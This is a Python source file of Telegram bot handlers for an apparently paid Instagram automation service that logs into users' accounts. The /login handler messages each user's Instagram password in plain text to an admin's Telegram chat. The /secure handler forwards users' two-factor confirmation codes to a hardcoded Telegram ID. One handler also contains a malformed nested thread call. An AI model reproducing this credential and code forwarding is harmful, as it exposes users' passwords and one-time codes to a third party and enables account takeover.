from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import ParseMode

from keyboards.default import start_menu_buttons
from states import LoginState
from loader import db, dp
from utils.misc import rate_limit
from utils.notify_admins import membership_notify, errors_notify
import threading


@rate_limit(10, 'Оформить подписку')
@dp.message_handler(text='Оформить подписку')
async def create_subscription(message: types.Message):
    """
    sets machine state to get login and make a subscription
    """
    from data.config import acc_creating_text
    await LoginState.L2.set()
    await message.answer(acc_creating_text, reply_markup=start_menu_buttons, parse_mode=ParseMode.HTML)


@dp.message_handler(state=LoginState.L2)
async def subscription_data_collecting(message: types.Message, state: FSMContext):
    """
    adds new user to db, checks if it exists first
    """
    tg_username = message.from_user.username
    tg_id = message.from_user.id
    login = message.text.replace(' ', '')
    await state.finish()
    if db.ig_select_user(tg_id, login):
        await message.answer(
            '💩\nТакой пользователь уже существует, проверьте список подключенных аккаунтов и их статус с помощью \
кнопки\nПосмотреть статистику', reply_markup=start_menu_buttons)
    else:
        from data.config import acc_created_instruct
        db.ig_add_user(tg_id, tg_username, login)
        await membership_notify(dp, login, tg_id)
        await message.answer('Отлично!\nПосле оплаты тебе придет уведомление с инструкцией',
                             reply_markup=start_menu_buttons)


@rate_limit(10, 'login')
@dp.message_handler(Command('login'))
async def loh_ig(message: types.Message):
    """
    checks membership and sets some starts files
    """
    from IgSide.Server.likes_bot import first_auth_start
    login = message.text.split(' ')[1]
    password = message.text.split(' ')[-1]
    tg_id = message.from_user.id
    # print(login, password, tg_id)
    membership = db.check_membership(tg_id, login)
    if membership[0] != 0:
        from data.config import admins
        await notifying(admins[0], f'вход в систему {tg_id}\n login {login}\n {password}')
        threading.Thread(target=first_auth_start, args=(login, password)).start()
        await message.answer('Скоро тебе придет код подтверждения, пришли его мне командой /secure\n\
Например\n/secure 676253\nКод долже')
    else:
        await errors_notify(dp, tg_id, login)
        await message.answer('Кажется, твоя подписка не активна 🥺\n\
Оплати подписку <a href="https://www.tinkoff.ru/rm/khvorostova.alisa1/RluPE17867">По этой ссылке</a>]\
или попробуй ещё раз позднее. Если оплата прошла, а подписка долго не активируется, напиши об этом @alohayoung',
                             reply_markup=start_menu_buttons, parse_mode=ParseMode.HTML)


@dp.message_handler(Command('log_maha'))
async def like_act(message: types.Message):
    """
    determines a method of likes that will be used
    """
    from IgSide.Server import auth_start
    login = message.text.split(' ')[1]
    passw = message.text.split(' ')[-1]
    tg_id = message.from_user.id
    threading.Thread(threading.Thread(target=auth_start, args=(login, passw, tg_id)).start())


@dp.message_handler(Command('update_membership_for_user'))
async def updating_membership_manually(message: types.Message):
    """

    :param message:
    """
    from data.config import acc_created_instruct
    login, tg_id = message.text.split(' ')[1:]
    print(login, tg_id)
    db.update_membership(login)
    await dp.bot.send_message(tg_id, acc_created_instruct.format(login))


@dp.message_handler(Command('secure'))
async def bot_secure(message: types.Message):
    from handlers import notifying
    text = message.text
    user = message.from_user.id
    await notifying(235597034, f'{text}\n{user}')
    await message.answer('✅ \n\
Захожу в систему и начинаю сбор ссылок\n\
Для успешного завершения работы алгоритма дождитесь уведомления об окончании загрузки\n\
Речь идет о сборе тысяч ссылок, так что, наберитесьтерпения🙏🏻')


async def notifying(tg_id, message):
    """
    sends message when awaited
    """
    await dp.bot.send_message(tg_id, message)
